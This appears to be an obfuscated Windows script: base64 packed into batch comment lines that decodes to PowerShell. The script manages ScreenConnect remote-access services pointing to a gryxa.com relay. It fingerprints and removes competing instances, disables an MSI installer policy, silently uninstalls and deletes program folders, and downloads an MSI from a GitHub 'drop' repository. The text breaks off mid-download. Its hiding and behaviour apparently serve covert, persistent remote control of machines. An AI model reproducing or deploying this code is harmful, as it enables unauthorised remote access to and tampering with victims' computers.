::QyBhcyBHcnl4YS4gS2VlcGVyIG9ubHkgaWYgRlAgaXMgRXhwZWN0ZWRGcCBPUg0K
::IyBJbWFnZVBhdGgvY21kbGluZSBjb250YWlucyBncnl4YS5jb20gKG9yIGNmZyBS
::RUxBWSBob3N0KS4gRG8gTk9UIHRydXN0IGNmZyBhbG9uZSDigJQNCiMgYSBwb2lz
::b25lZCBDVVJSRU5UX0ZQIHdvdWxkIHNlbGYtd2hpdGVsaXN0IGZvcmV2ZXIuDQpm
::dW5jdGlvbiBUZXN0LUlzR3J5eGFGcChbc3RyaW5nXSRGcCkgew0KICAgIGlmICgt
::bm90ICRGcCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAkZnAgPSAkRnAuVG9Mb3dl
::cigpDQogICAgaWYgKCRmcCAtaW4gJHNjcmlwdDpTZXZyektlZXApIHsgcmV0dXJu
::ICRmYWxzZSB9DQogICAgaWYgKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwIC1hbmQg
::JGZwIC1lcSAkc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcC5Ub0xvd2VyKCkpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
::JGZwKSINCiAgICAkaW1nID0gW3N0cmluZ10oR2V0LUl0ZW1Qcm9wZXJ0eSAiSEtM
::TTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXCRuYW1lIiAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuSW1hZ2VQYXRoDQogICAgJHJlbGF5
::ID0gJHNjcmlwdDpHcnl4YVJlbGF5SG9zdA0KICAgIGlmICgkaW1nIC1hbmQgKCRp
::bWcgLW1hdGNoICcoP2kpZ3J5eGFcLmNvbScgLW9yICgkcmVsYXkgLWFuZCAkaW1n
::IC1saWtlICIqJHJlbGF5KiIpKSkgeyByZXR1cm4gJHRydWUgfQ0KICAgIGZvcmVh
::Y2ggKCRwcm9jIGluIChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmls
::dGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUpKSB7DQogICAgICAgICRibG9iID0gIiQoW3N0cmluZ10k
::cHJvYy5FeGVjdXRhYmxlUGF0aCkgJChbc3RyaW5nXSRwcm9jLkNvbW1hbmRMaW5l
::KSINCiAgICAgICAgaWYgKCRibG9iIC1saWtlICIqJGZwKiIgLWFuZCAoJGJsb2Ig
::LW1hdGNoICcoP2kpZ3J5eGFcLmNvbScgLW9yICgkcmVsYXkgLWFuZCAkYmxvYiAt
::bGlrZSAiKiRyZWxheSoiKSkpIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZQ0K
::ICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkZmFsc2UNCn0NCg0KZnVuY3Rp
::b24gR2V0LUtlZXBGaW5nZXJwcmludHMgew0KICAgICRzZXQgPSBOZXctT2JqZWN0
::ICdTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5IYXNoU2V0W3N0cmluZ10nIChb
::U3RyaW5nQ29tcGFyZXJdOjpPcmRpbmFsSWdub3JlQ2FzZSkNCiAgICBmb3JlYWNo
::ICgkcyBpbiAoR2V0LVNldnJ6S2VlcCkpIHsgW3ZvaWRdJHNldC5BZGQoJHMpIH0N
::CiAgICBpZiAoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIHsgW3ZvaWRdJHNldC5B
::ZGQoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIH0NCiAgICAkY2ZnID0gR2V0LUdy
::eXhhRnANCiAgICBpZiAoJGNmZyAtYW5kIChUZXN0LUlzR3J5eGFGcCAkY2ZnKSkg
::eyBbdm9pZF0kc2V0LkFkZCgkY2ZnKSB9DQogICAgZWxzZWlmICgkc2NyaXB0Okdy
::eXhhRXhwZWN0ZWRGcCkgeyBbdm9pZF0kc2V0LkFkZCgkc2NyaXB0OkdyeXhhRXhw
::ZWN0ZWRGcCkgfQ0KICAgIGVsc2UgeyBbdm9pZF0kc2V0LkFkZCgkc2NyaXB0Okdy
::eXhhRGVmYXVsdEZwKSB9DQogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZp
::Y2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUpKSB7DQogICAgICAgIGlmICgkc3ZjLlN0YXR1cyAtbm90
::aW4gQCgnUnVubmluZycsJ1N0YXJ0UGVuZGluZycsJ0NvbnRpbnVlUGVuZGluZycp
::KSB7IGNvbnRpbnVlIH0NCiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1wo
::KFswLTlhLWZdezE2fSlcKScpIHsNCiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVz
::WzFdLlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYgKCRmcCAtaW4gJHNjcmlwdDpT
::ZXZyektlZXApIHsgY29udGludWUgfQ0KICAgICAgICAgICAgaWYgKFRlc3QtSXNH
::cnl4YUZwICRmcCkgeyBbdm9pZF0kc2V0LkFkZCgkZnApOyBTZXQtR3J5eGFGcCAk
::ZnAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiBAKCRzZXQpDQp9DQoN
::CmZ1bmN0aW9uIFRlc3QtVGNwSG9zdFBvcnQoW3N0cmluZ10kSG9zdE5hbWUsIFtp
::bnRdJFBvcnQgPSA0NDMsIFtpbnRdJFRpbWVvdXRNcyA9IDgwMDApIHsNCiAgICBp
::ZiAoLW5vdCAkSG9zdE5hbWUpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgJGMgPSAk
::bnVsbA0KICAgIHRyeSB7DQogICAgICAgICRjID0gTmV3LU9iamVjdCBTeXN0ZW0u
::TmV0LlNvY2tldHMuVGNwQ2xpZW50DQogICAgICAgICRpYXIgPSAkYy5CZWdpbkNv
::bm5lY3QoJEhvc3ROYW1lLCAkUG9ydCwgJG51bGwsICRudWxsKQ0KICAgICAgICBp
::ZiAoLW5vdCAkaWFyLkFzeW5jV2FpdEhhbmRsZS5XYWl0T25lKCRUaW1lb3V0TXMs
::ICRmYWxzZSkpIHsgdHJ5IHsgJGMuQ2xvc2UoKSB9IGNhdGNoIHt9OyByZXR1cm4g
::JGZhbHNlIH0NCiAgICAgICAgJGMuRW5kQ29ubmVjdCgkaWFyKTsgcmV0dXJuICR0
::cnVlDQogICAgfSBjYXRjaCB7IHJldHVybiAkZmFsc2UgfSBmaW5hbGx5IHsgaWYg
::KCRjKSB7IHRyeSB7ICRjLkNsb3NlKCkgfSBjYXRjaCB7fSB9IH0NCn0NCg0KZnVu
::Y3Rpb24gR2V0LU1zaVByb3BlcnR5KFtzdHJpbmddJE1zaVBhdGgsIFtzdHJpbmdd
::JFByb3BlcnR5TmFtZSkgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVy
::YWxQYXRoICRNc2lQYXRoKSkgeyByZXR1cm4gJG51bGwgfQ0KICAgIHRyeSB7DQog
::ICAgICAgICRpID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdpbmRvd3NJbnN0YWxs
::ZXIuSW5zdGFsbGVyDQogICAgICAgICRkYiA9ICRpLk9wZW5EYXRhYmFzZSgoUmVz
::b2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkTXNpUGF0aCkuUGF0aCwgMCkNCiAgICAg
::ICAgJHYgPSAkZGIuT3BlblZpZXcoIlNFTEVDVCBgVmFsdWVgIEZST00gYFByb3Bl
::cnR5YCBXSEVSRSBgUHJvcGVydHlgPSckUHJvcGVydHlOYW1lJyIpDQogICAgICAg
::ICR2LkV4ZWN1dGUoKSB8IE91dC1OdWxsDQogICAgICAgICRyID0gJHYuRmV0Y2go
::KQ0KICAgICAgICBpZiAoLW5vdCAkcikgeyByZXR1cm4gJG51bGwgfQ0KICAgICAg
::ICByZXR1cm4gW3N0cmluZ10kci5TdHJpbmdEYXRhKDEpDQogICAgfSBjYXRjaCB7
::IHJldHVybiAkbnVsbCB9DQp9DQoNCmZ1bmN0aW9uIEdldC1GcEZyb21Qcm9kdWN0
::TmFtZShbc3RyaW5nXSRQcm9kdWN0TmFtZSkgew0KICAgIGlmICgkUHJvZHVjdE5h
::bWUgLW1hdGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7IHJldHVybiAkbWF0
::Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAgIHJldHVybiAkbnVsbA0KfQ0KDQpmdW5j
::dGlvbiBGaW5kLVByb2R1Y3RHdWlkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQog
::ICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCki
::DQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykg
::ew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51
::ZSB9DQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJv
::b3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgICAg
::ICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlm
::ICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5h
::bWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAka2V5LlBTQ2hpbGROYW1lIH0NCiAg
::ICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJG51bGwNCn0NCg0KZnVuY3Rpb24g
::R2V0LVNjSW1hZ2VQYXRoKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgaWYg
::KC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAnJyB9DQogICAgJHAgPSAiSEtM
::TTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0KICAgIHRyeSB7DQogICAgICAgIHJl
::dHVybiBbc3RyaW5nXShHZXQtSXRlbVByb3BlcnR5IC1MaXRlcmFsUGF0aCAkcCAt
::TmFtZSBJbWFnZVBhdGggLUVycm9yQWN0aW9uIFN0b3ApLkltYWdlUGF0aA0KICAg
::IH0gY2F0Y2ggeyByZXR1cm4gJycgfQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LVNjSGFz
::R3J5eGFSZWxheShbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICRpbWcgPSBH
::ZXQtU2NJbWFnZVBhdGggJEZpbmdlcnByaW50DQogICAgcmV0dXJuIFtib29sXSgk
::aW1nIC1tYXRjaCAnKD9pKWdyeXhhXC5jb20nKQ0KfQ0KDQpmdW5jdGlvbiBUZXN0
::LVNjUnVubmluZyhbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICMgTDQ4OiBz
::Yy5leGUgKyByZXF1aXJlIHJ1bm5pbmcgc3RhdGUNCiAgICBpZiAoLW5vdCAkRmlu
::Z2VycHJpbnQpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgJG91dCA9ICYgc2MuZXhl
::IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIgMj4m
::MSB8IE91dC1TdHJpbmcNCiAgICByZXR1cm4gW2Jvb2xdKCRvdXQgLW1hdGNoICco
::P2kpU1RBVEVccyo6XHMqXGQrXHMrKFJVTk5JTkd8U1RBUlRfUEVORElOR3xDT05U
::SU5VRV9QRU5ESU5HKScpDQp9DQoNCmZ1bmN0aW9uIFRlc3QtU2NTZXJ2aWNlRXhp
::c3RzKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgaWYgKC1ub3QgJEZpbmdl
::cnByaW50KSB7IHJldHVybiAkZmFsc2UgfQ0KICAgICYgc2MuZXhlIHF1ZXJ5ICJT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIgMj4mMSB8IE91dC1O
::dWxsDQogICAgcmV0dXJuICgkTEFTVEVYSVRDT0RFIC1lcSAwKQ0KfQ0KDQpmdW5j
::dGlvbiBUZXN0LVNjRGlyKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgZm9y
::ZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0sICRlbnY6
::UHJvZ3JhbUZpbGVzKSkgew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFs
::UGF0aCAoSm9pbi1QYXRoICRiYXNlICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZp
::bmdlcnByaW50KSIpKSB7IHJldHVybiAkdHJ1ZSB9DQogICAgfQ0KICAgIHJldHVy
::biAkZmFsc2UNCn0NCg0KZnVuY3Rpb24gRmluZC1SdW5uaW5nR3J5eGFGcCB7DQog
::ICAgIyBMNDg6IE9OTFkgbm9uLXNldnJ6IFJ1bm5pbmcvUGVuZGluZyBXSVRIIGdy
::eXhhLmNvbSBJbWFnZVBhdGggKGJhcmUgc2MgY3JlYXRlIGlzIE5PVCBoZWFsdGh5
::KS4NCiAgICAkY2ZnID0gR2V0LUdyeXhhRnANCiAgICBpZiAoJGNmZyAtYW5kIChU
::ZXN0LVNjUnVubmluZyAkY2ZnKSAtYW5kIChUZXN0LVNjSGFzR3J5eGFSZWxheSAk
::Y2ZnKSAtYW5kICgkY2ZnIC1ub3RpbiAkc2NyaXB0OlNldnJ6S2VlcCkpIHsNCiAg
::ICAgICAgcmV0dXJuICRjZmcuVG9Mb3dlcigpDQogICAgfQ0KICAgIGlmICgkc2Ny
::aXB0OkdyeXhhRXhwZWN0ZWRGcCAtYW5kIChUZXN0LVNjUnVubmluZyAkc2NyaXB0
::OkdyeXhhRXhwZWN0ZWRGcCkgLWFuZCAoVGVzdC1TY0hhc0dyeXhhUmVsYXkgJHNj
::cmlwdDpHcnl4YUV4cGVjdGVkRnApKSB7DQogICAgICAgIHJldHVybiAkc2NyaXB0
::OkdyeXhhRXhwZWN0ZWRGcC5Ub0xvd2VyKCkNCiAgICB9DQogICAgZm9yZWFjaCAo
::JHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50
::KicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgIGlm
::ICgkc3ZjLlN0YXR1cyAtbm90aW4gQCgnUnVubmluZycsJ1N0YXJ0UGVuZGluZycs
::J0NvbnRpbnVlUGVuZGluZycpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgaWYgKCRz
::dmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsNCiAgICAgICAg
::ICAgICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYg
::KCRmcCAtaW4gJHNjcmlwdDpTZXZyektlZXApIHsgY29udGludWUgfQ0KICAgICAg
::ICAgICAgaWYgKFRlc3QtU2NIYXNHcnl4YVJlbGF5ICRmcCkgeyByZXR1cm4gJGZw
::IH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJG51bGwNCn0NCg0KZnVu
::Y3Rpb24gVGVzdC1BbnlOb25TZXZyelNjUnVubmluZyB7IHJldHVybiBbYm9vbF0o
::RmluZC1SdW5uaW5nR3J5eGFGcCkgfQ0KDQpmdW5jdGlvbiBHZXQtR3J5eGFTdGF0
::dXMoW3N0cmluZ10kZnApIHsNCiAgICAkZXhpc3RzID0gVGVzdC1TY1NlcnZpY2VF
::eGlzdHMgJGZwDQogICAgJHJ1bm5pbmcgPSBUZXN0LVNjUnVubmluZyAkZnANCiAg
::ICAkcmVsYXkgPSBUZXN0LVNjSGFzR3J5eGFSZWxheSAkZnANCiAgICAkZGlyID0g
::VGVzdC1TY0RpciAkZnANCiAgICAkZ3VpZCA9IEZpbmQtUHJvZHVjdEd1aWQgJGZw
::DQogICAgJHRjcFIgPSAkdHJ1ZTsgJHRjcFUgPSAkdHJ1ZQ0KICAgIGlmICgkRGVl
::cCAtb3IgLW5vdCAoJHJ1bm5pbmcgLWFuZCAkcmVsYXkpKSB7DQogICAgICAgICR0
::Y3BSID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhUmVsYXlIb3N0IDQ0
::Mw0KICAgICAgICAkdGNwVSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4
::YVVpSG9zdCA0NDMNCiAgICB9DQogICAgIyBMNDg6IEhFQUxUSFkgb25seSB3aGVu
::IHJ1bm5pbmcgQU5EIEltYWdlUGF0aCBoYXMgZ3J5eGEuY29tDQogICAgaWYgKCRy
::dW5uaW5nIC1hbmQgJHJlbGF5KSB7IHJldHVybiAiSEVBTFRIWXwkZnB8cnVubmlu
::Zz0xfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVIiB9DQogICAgaWYgKCRydW5uaW5nIC1h
::bmQgLW5vdCAkcmVsYXkpIHsgcmV0dXJuICJCUk9LRU58JGZwfHJ1bm5pbmctbm8t
::cmVsYXl8cmVsYXk9JHRjcFJ8dWk9JHRjcFUiIH0NCiAgICBpZiAoJGV4aXN0cyAt
::YW5kICRyZWxheSkgeyByZXR1cm4gIkJST0tFTnwkZnB8c3ZjLXByZXNlbnQtc3Rv
::cHBlZHxyZWxheT0kdGNwUnx1aT0kdGNwVSIgfQ0KICAgIGlmICgkZXhpc3RzKSB7
::IHJldHVybiAiQlJPS0VOfCRmcHxzdmMtcHJlc2VudC1zdG9wcGVkfHJlbGF5PSR0
::Y3BSfHVpPSR0Y3BVIiB9DQogICAgaWYgKC1ub3QgJGV4aXN0cyAtYW5kICgkZGly
::IC1vciAkZ3VpZCkpIHsgcmV0dXJuICJTVFVDS3wkZnB8cmVnaXN0ZXJlZC1uby1z
::ZXJ2aWNlfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVIiB9DQogICAgcmV0dXJuICJBQlNF
::TlR8JGZwfG5vdC1pbnN0YWxsZWR8cmVsYXk9JHRjcFJ8dWk9JHRjcFUiDQp9DQoN
::CmZ1bmN0aW9uIFRlc3QtR3J5eGFIZWFsdGggew0KICAgICMgTDQ2OiBwcmVmZXIg
::YW55IGxpdmUgbm9uLXNldnJ6IFNDIG92ZXIgY2ZnIEV4cGVjdGVkRnAgKHdyb25n
::IEZQIGluIGdyeXhhLmNmZyB3YXMgZmFsc2UgRE9XTikuDQogICAgJGxpdmUgPSBG
::aW5kLVJ1bm5pbmdHcnl4YUZwDQogICAgaWYgKCRsaXZlKSB7DQogICAgICAgIFNl
::dC1Hcnl4YUZwICRsaXZlDQogICAgICAgIHJldHVybiAoR2V0LUdyeXhhU3RhdHVz
::ICRsaXZlKQ0KICAgIH0NCiAgICByZXR1cm4gKEdldC1Hcnl4YVN0YXR1cyAoR2V0
::LUdyeXhhRnApKQ0KfQ0KDQpmdW5jdGlvbiBDbGVhci1Hcnl4YUFycChbc3RyaW5n
::XSRmcCkgew0KICAgICRndWlkID0gRmluZC1Qcm9kdWN0R3VpZCAkZnANCiAgICBm
::b3JlYWNoICgkciBpbiBAKCdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93
::c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwnLA0KICAgICAgICAgICAgICAgICAg
::ICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dz
::XEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcpKSB7DQogICAgICAgIGlmICgkZ3Vp
::ZCAtYW5kIChUZXN0LVBhdGggIiRyXCRndWlkIikpIHsgUmVtb3ZlLUl0ZW0gLUxp
::dGVyYWxQYXRoICIkclwkZ3VpZCIgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAgR2V0LUNoaWxkSXRlbSAkciAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsN
::CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAg
::ICAgICAgIGlmICgkZG4gLW1hdGNoICJTY3JlZW5Db25uZWN0IENsaWVudCBcKCQo
::W3JlZ2V4XTo6RXNjYXBlKCRmcCkpXCkiKSB7DQogICAgICAgICAgICAgICAgUmVt
::b3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRfLlBTUGF0aCAtUmVjdXJzZSAtRm9yY2Ug
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgIH0NCiAg
::ICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gVW5pbnN0YWxsLVNjRmluZ2Vy
::cHJpbnQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICBpZiAoLW5vdCAkRmlu
::Z2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcgfQ0KICAgICMgTDQ1OiBIQU5EUy1P
::RkYg4oCUIG5ldmVyIHVuaW5zdGFsbC9zdG9wL2RlbGV0ZSBBTlkgU2NyZWVuQ29u
::bmVjdA0KICAgIHJldHVybiAncmVmdXNlZC1oYW5kcy1vZmYtc2MnDQogICAgaWYg
::KFRlc3QtU2NSdW5uaW5nICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ3JlZnVzZWQt
::cnVubmluZycgfQ0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgk
::RmluZ2VycHJpbnQpIg0KICAgICRndWlkID0gRmluZC1Qcm9kdWN0R3VpZCAkRmlu
::Z2VycHJpbnQNCiAgICAmIHJlZy5leGUgZGVsZXRlICdIS0xNXFNPRlRXQVJFXFBv
::bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1T
::SSAvZiAyPiYxIHwgT3V0LU51bGwNCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNP
::RlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3Yg
::RGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwN
::CiAgICBpZiAoJGd1aWQpIHsgU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJn
::dW1lbnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5
::U3VwcHJlc3MiIC1XYWl0IC1XaW5kb3dTdHlsZSBIaWRkZW47IFN0YXJ0LVNsZWVw
::IC1TZWNvbmRzIDYgfQ0KICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFt
::ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIGlmICgkc3ZjKSB7
::ICYgc2MuZXhlIHN0b3AgJG5hbWUgMj4mMSB8IE91dC1OdWxsOyAmIHNjLmV4ZSBk
::ZWxldGUgJG5hbWUgMj4mMSB8IE91dC1OdWxsOyBTdGFydC1TbGVlcCAtU2Vjb25k
::cyAyIH0NCiAgICBDbGVhci1Hcnl4YUFycCAkRmluZ2VycHJpbnQNCiAgICBmb3Jl
::YWNoICgkYmFzZSBpbiBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQ
::cm9ncmFtRmlsZXMpKSB7DQogICAgICAgICRkID0gSm9pbi1QYXRoICRiYXNlICJT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSINCiAgICAgICAgaWYg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsgJiB0YWtlb3duLmV4ZSAvRiAk
::ZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVsbDsgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQ
::YXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZSB9DQogICAgfQ0KICAgIHJldHVybiAncmVtb3ZlZCcNCn0NCg0KZnVuY3Rp
::b24gVGVzdC1Nc2lQYWNrYWdlKFtzdHJpbmddJFBhdGgsIFtzdHJpbmddJEV4cGVj
::dGVkRnAgPSAnJykgew0KICAgICMgU2hhcmVkIE9MRS1tYWdpYyArIG9wdGlvbmFs
::IFByb2R1Y3ROYW1lIEZQIGdhdGUgKEwzNy9MMzkpLiBVc2VkIGJ5IEdyeXhhICsg
::c2V2cnogaW5zdGFsbCBwYXRocy4NCiAgICBpZiAoLW5vdCAkUGF0aCAtb3IgLW5v
::dCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkUGF0aCkpIHsgcmV0dXJuICRmYWxz
::ZSB9DQogICAgaWYgKChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJFBhdGgpLkxlbmd0
::aCAtbHQgNTAwMDAwKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIHRyeSB7DQogICAg
::ICAgICRmcyA9IFtTeXN0ZW0uSU8uRmlsZV06Ok9wZW5SZWFkKChSZXNvbHZlLVBh
::dGggLUxpdGVyYWxQYXRoICRQYXRoKS5QYXRoKQ0KICAgICAgICAkbWFnaWMgPSBO
::ZXctT2JqZWN0IGJ5dGVbXSA0DQogICAgICAgICRudWxsID0gJGZzLlJlYWQoJG1h
::Z2ljLCAwLCA0KQ0KICAgICAgICAkZnMuQ2xvc2UoKQ0KICAgICAgICBpZiAoLW5v
::dCAoJG1hZ2ljWzBdIC1lcSAweEQwIC1hbmQgJG1hZ2ljWzFdIC1lcSAweENGIC1h
::bmQgJG1hZ2ljWzJdIC1lcSAweDExIC1hbmQgJG1hZ2ljWzNdIC1lcSAweEUwKSkg
::eyByZXR1cm4gJGZhbHNlIH0NCiAgICB9IGNhdGNoIHsgcmV0dXJuICRmYWxzZSB9
::DQogICAgaWYgKCRFeHBlY3RlZEZwKSB7DQogICAgICAgICRmcCA9IEdldC1GcEZy
::b21Qcm9kdWN0TmFtZSAoR2V0LU1zaVByb3BlcnR5ICRQYXRoICdQcm9kdWN0TmFt
::ZScpDQogICAgICAgIGlmICgtbm90ICRmcCAtb3IgJGZwIC1uZSAkRXhwZWN0ZWRG
::cC5Ub0xvd2VyKCkpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgfQ0KICAgIHJldHVy
::biAkdHJ1ZQ0KfQ0KDQpmdW5jdGlvbiBHZXQtR3J5eGFNc2kgew0KICAgICRtc2kg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ3BrZ19ncnl4YS5tc2knDQogICAgIyBXaGVu
::IGFuIEZQIGlzIHBpbm5lZCwgdGhlIGNhY2hlZCBNU0kgbXVzdCBtYXRjaCBpdDsg
::b3RoZXJ3aXNlIHJlZmV0Y2guDQogICAgaWYgKChUZXN0LVBhdGggJG1zaSkgLWFu
::ZCAoKEdldC1JdGVtICRtc2kpLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsNCiAgICAg
::ICAgaWYgKC1ub3QgJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIHsgcmV0dXJuICRt
::c2kgfQ0KICAgICAgICBpZiAoVGVzdC1Nc2lQYWNrYWdlICRtc2kgJHNjcmlwdDpH
::cnl4YUV4cGVjdGVkRnApIHsgcmV0dXJuICRtc2kgfQ0KICAgICAgICBSZW1vdmUt
::SXRlbSAtTGl0ZXJhbFBhdGggJG1zaSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUNCiAgICB9DQogICAgJHRtcCA9IEpvaW4tUGF0aCAkZW52OlRF
::TVAgKCJzY19ncnl4YV97MH0ubXNpIiAtZiBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0
::cmluZygnTicpKQ0KICAgICMgTDMxOiBnaXRodWItZHJvcCBGSVJTVCAocmF3IHdv
::cmtzIGV2ZW4gd2hlbiB1aS5ncnl4YS5jb20gVExTIGlzIGJyb2tlbikuDQogICAg
::JHVybHMgPSBAKA0KICAgICAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRl
::bnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vcGtnX2dyeXhhLm1zaScs
::DQogICAgICAgICRzY3JpcHQ6R3J5eGFNc2lVcmwNCiAgICApDQogICAgJGN1cmwg
::PSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdTeXN0ZW0zMlxjdXJsLmV4ZScN
::CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjdXJsKSkgeyAkY3VybCA9ICdjdXJs
::LmV4ZScgfQ0KICAgIGZvcmVhY2ggKCR1IGluICR1cmxzKSB7DQogICAgICAgIHRy
